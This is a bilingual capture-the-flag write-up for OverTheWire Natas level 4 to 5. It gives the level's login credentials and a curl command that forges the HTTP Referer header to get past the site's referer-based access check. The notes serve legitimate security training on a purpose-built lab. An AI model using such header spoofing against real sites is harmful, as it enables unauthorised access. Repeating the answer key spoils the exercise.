# Natas Nivel 4 → 5

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 4 → 5 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas4.natas.labs.overthewire.org` |

# Username
natas4
# Password
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
# Web vulnerability
HTTP Referer header used as security mechanism
# Method of solve
Use curl to access the page to supply customer HTTP Referer header
```
curl -vv -H 'Referer: http://natas5.natas.labs.overthewire.org/' -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ  http://natas4.natas.labs.overthewire.org/
```

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
